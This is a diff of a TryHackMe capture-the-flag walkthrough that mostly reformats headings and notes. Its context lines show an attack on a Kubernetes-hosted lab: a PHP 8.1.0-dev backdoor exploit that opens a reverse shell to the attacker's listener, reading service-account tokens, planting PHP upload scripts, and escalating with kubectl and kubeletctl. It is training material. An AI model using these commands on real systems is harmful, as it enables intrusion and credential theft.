@@ -16,20 +16,21 @@ Access it <a href="https://tryhackme.com/room/frankandherbytryagain">here</a>.<b
 <br>
 <br>
 <h1 align="center">Summary</h1>
-<p>
+<p  align="center">
   
-- Port Scanning → Service Discovery<br>
-- Web Vulberability Scanning<br>
-- Directory and File Enumeration<br>
-- Web Interface Inspection<br>
-- Weaponization<br>
-- Delivery and Execution<br>
-- Initial Foothold<br>
-- ...</p>
+[Port Scanning → Service Discovery](#1)<br>
+[Web Vulberability Scanning](#2)<br>
+[Directory and File Enumeration](#3)<br>
+[Web Interface Inspection](#4)<br>
+[Weaponization](#5)<br>
+[Delivery and Execution](#6)<br>
+[Initial Foothold](#7)<br>
+[Privileged Access via Kubernetes Service Account & User Flag](#8)<br>
+[Privilege Escalation & Root Flag](#9)</p>
 
 <br>
 <br>
-<h1 align="center">Port Scanning → Service Discovery</h1>
+<h1 align="center">Port Scanning → Service Discovery<a id='1'></a></h1>
 <p align="center"><strong>8</strong> open ports</p>
 <br>
 
@@ -201,7 +202,7 @@ PORT      STATE SERVICE     VERSION
 
 <br>
 <br>
-<h1 align="center">Web Vulberability Scanning</h1>
+<h1 align="center">Web Vulberability Scanning<a id='2'></a></h1>
 <p align="center"><code>25000</code> and <code>30679</code>code>are the only ports confirmed to be running HTTP services with banners or headers that Nikto can analyze effectively.<br>Other ports are likely Kubernetes or API endpoints that Nikto is not optimized to scan.</p>
 
 <br>
@@ -277,7 +278,7 @@ PORT      STATE SERVICE     VERSION
 
 <br>
 <br>
-<h1 align="center">Directory and File Enumeration</h1>
+<h1 align="center">Directory and File Enumeration<a id='3'></a></h1>
 <p align="center">10255</p>
 
 ```bash
@@ -370,7 +371,7 @@ Task Completed
 
 <br>
 <br>
-<h1 align="center">Web Interface Inspection</h1>
+<h1 align="center">Web Interface Inspection<a id='4'></a></h1>
 <p align="center">10250</p>
 
 <img width="1226" height="187" alt="image" src="https://github.com/user-attachments/assets/8798172c-aa7f-48de-9b29-8e0e0271742c" />
@@ -414,7 +415,7 @@ Task Completed
 <br>
 <br>
 <br>
-<h1 align="center">Weaponization</h1>
+<h1 align="center">Weaponization<a id='5'></a></h1>
 
 
 ```bash
@@ -465,8 +466,8 @@ python3 revshell_php_8.1.0-dev.py http://<Target_IP>:<Target_Port> <Attack_IP> <
 
 <br>
 <br>
-<h1 align="center">Delivery and Execution</h1>
-<p align="center">Exploit execution</p>
+<h1 align="center">Delivery and Execution<a id='6'></a></h1>
+<p align="center">Executed the exploit</p>
 
 ```bash
 :~/FrankandHerbyTryAgain/php-8.1.0-dev-backdoor-rce# python3 revshell_php_8.1.0-dev.py http://xx.xxx.xx.xx:30679 xx.xxx.xx.xx 9001
@@ -474,13 +475,15 @@ python3 revshell_php_8.1.0-dev.py http://<Target_IP>:<Target_Port> <Attack_IP> <
 
 <br>
 <br>
-<h1 align="center">Initial Foothold</h1>
+<h1 align="center">Initial Foothold<a id='7'></a></h1>
 
 ```bash
 :~/FrankandHerbyTryAgain# nc -nlvp 9001
 ...
 root@php-deploy-6d998f68b9-fvtcg:/var/www/html# 
 ```
+
+<h1 align="center">Privileged Access via Kubernetes Service Account & User Flag<a id='8'></a></h1>
 
 ```bash
 root@php-deploy-6d998f68b9-fvtcg:/var/www/html# ls -lah
@@ -559,12 +562,7 @@ root@php-deploy-6d998f68b9-fvtcg:/run/secrets/kubernetes.io/serviceaccount# cat 
 ```
 
 <br>
-<p>
-  
-- there is no microk8s, no curl, no wget, ...<br>
-- downloaded kubectl<br>
-- invested a lot of efftort to upload kubectl unnecessarily<br><br>
-- set up an HTTP server</p>
+<p align="center">With no access to microk8s, curl, or wget, I decided to uploade <strong>kubectl</strong>kubectl<br> in the target VM.<br>I spent considerable effort uploading itonly to realize later it wasn’t necessary.<br><br>Set up an HTTP server</p>
 
 ```bash
 :~/FrankandHerbyTryAgain# python3 -m http.server
@@ -572,11 +570,8 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 ```
 
 <br>
-<p>
+<p align="center">Downloaded <strong>kubectl</strong> to traget VM.<br>Crafted a File Upload Script <code>hi.php</code>.<br>Followed the guidance available  <a href="https://www.w3schools.com/php/php_file_upload.asp">here</a></p>p
 
-- downloaded kubectl<br>
-- crafted a File Upload Script <code>hi.php</code><br>
-- discovered it here: https://www.w3schools.com/php/php_file_upload.asp</p>
 
 ```bash
 :~/FrankandHerbyTryAgain# curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
@@ -587,6 +582,7 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 ```
 
 <br>
+<p align="center">Created <strong>hi.php</strong> aiming to upload <strong>kubectl</strong> to the target.</p>
 
 ```bash
 root@php-deploy-6d998f68b9-fvtcg:/var/www/html# echo '<?php $target_dir = "uploads/";$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);$uploadOk = 1;$imageFileType = strtolower(pathinfo($target_file,PATHINFO_EXTENSION));if(isset($_POST["submit"])) {  $check = getimagesize($_FILES["fileToUpload"]["tmp_name"]);  if($check !== false) { echo "File is an image - " . $check["mime"] . ".";  $uploadOk = 1;  } else {  echo "File is not an image.";  $uploadOk = 0;  }}?>' > hi.php
@@ -597,9 +593,7 @@ root@php-deploy-6d998f68b9-fvtcg:/var/www/html# exit
 ```
 
 <br>
-<p>
-
-- navigated to :30679/hi.php</p>
+<p align="center">Navigated to <strong>xx.xxx.xx.xx:30679/hi.php</strong><br><strong>kubectl</strong> was successfully uploaded.</p>
 
 ```bash
 :~/FrankandHerbyTryAgain# python3 -m http.server
@@ -613,11 +607,7 @@ chmod +x kubectl
 ```
 
 <br>
-<p>
-
-- after attempts to evolve in this challenge, on many different days, I learned that I could transfer files in an simpler way<br><br><br>
-- I have never needed so much faith and grit to keep going ...</p>
-
+<p align="center">Since August, I’ve faced this challenge across many different days, each one demanding persistence and creativity. Discovering a simpler way to transfer files was a breakthrough, bu it´s just one step.<br><br>💙 I’m relying on that same strength to stay focused and keep building my career in information security!</p>
 
 ```bash
 root@php-deploy-6d998f68b9-fvtcg:/var/www/html# cat > /var/www/html/aa.php << 'EOF'
@@ -637,9 +627,7 @@ root@php-deploy-6d998f68b9-fvtcg:/var/www/html# exit
 ```
 
 <br>
-<p>
-
-- navigated to :30679/aa.php</p>
+<p align="center">Navigated to <strong>xx.xxx.xx.xx:30679/aa.php</strong></p>
 
 
 ```bash
@@ -669,9 +657,7 @@ frankland         op-token-26qmx                                   kubernetes.io
 ```
 
 <br>
-<p>
-
-- path: /home/herby/app</p>
+<p align="center">Identified <strong>path</strong>: <strong>/home/herby/app </strong></p>
 
 ```bash
 root@php-deploy-6d998f68b9-fvtcg:/var/www/html# ./kubectl get pods frankland php-deploy-6d998f68b9-wlslz -o yaml
@@ -744,7 +730,7 @@ php-deploy-6d998f68b9-fvtcg   1/1     Running       0             65m
 ```
 
 <br>
-<p><em>rosana.yaml</em></p>
+<p align="center">Created <em>rosana.yaml</em> substituting some parameters of the penultimate step output.<em></p>
 
 ```bash
 apiVersion: v1
@@ -838,10 +824,8 @@ THM{*-******-****-*****}
 
 <br>
 <br>
-
-<p>
-
-- I should have performed the following steps before</p>
+<h1 align="center">Privilege Escalation & Root Flag<a id='9'></a></h1>
+<p align="center">I should have performed the following steps before ...<br>Installed <strong>Kubeletctl</strong> following the instructions <a href="https://github.com/cyberark/kubeletctl">here</a><br>Used <strong>Kubeletctl</strong> to check for pods and namespaces<br>Identified <strong>frankland</strong></p>
 
 ```bash
 :~/FrankandHerbyTryAgain# kubeletctl pods -s xx.xxx.xx.xx --http --port 10255
@@ -852,6 +836,8 @@ THM{*-******-****-*****}
 <br>
 <br>
 <br>
+
+<p align="center">Enumerated <strong>frankland</strong>.</p>
 
 ```bash
 :~/FrankandHerbyTryAgain#   ./kubectl --server https://xx.xxx.xx.xx:16443 --certificate-authority=ca.crt --token=$token get deployments -n frankland
